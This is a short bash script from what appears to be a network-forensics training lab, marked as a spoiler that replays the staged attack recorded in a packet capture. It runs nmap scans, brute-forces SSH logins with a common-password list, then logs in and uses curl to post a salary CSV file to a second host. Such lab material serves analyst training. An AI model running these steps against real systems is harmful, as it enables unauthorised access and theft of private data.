#!/bin/bash
# !!! SPOILER — this script PERFORMS the staged attack that artifacts/capture.pcap
# records. Analysts: answer QUESTIONS.md from the PCAP + logs first, then read this
# to check your work. See WALKTHROUGH.md for the annotated version.
set -u
V=10.89.0.10
SSH="ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=4"

echo "[phase1] recon"
sleep 2
nmap -sS -F "$V"
sleep 1
nmap -sV -p 22,80 "$V"

echo "[phase2] brute-force dev@devserver"
sleep 3
for pw in password 123456 qwerty letmein welcome dragon admin hunter2 sunshine devops master trustno1; do
  sshpass -p "$pw" $SSH dev@$V exit >/dev/null 2>&1
done

echo "[phase3] login + exfil"
sleep 2
sshpass -p 'dev123' $SSH dev@$V exit >/dev/null 2>&1
sleep 1
sshpass -p 'dev123' $SSH dev@$V 'whoami; hostname; curl -s -X POST --data-binary @/srv/intranet/salary_backup.csv http://10.89.0.20:8000/upload; echo'
echo "[done]"
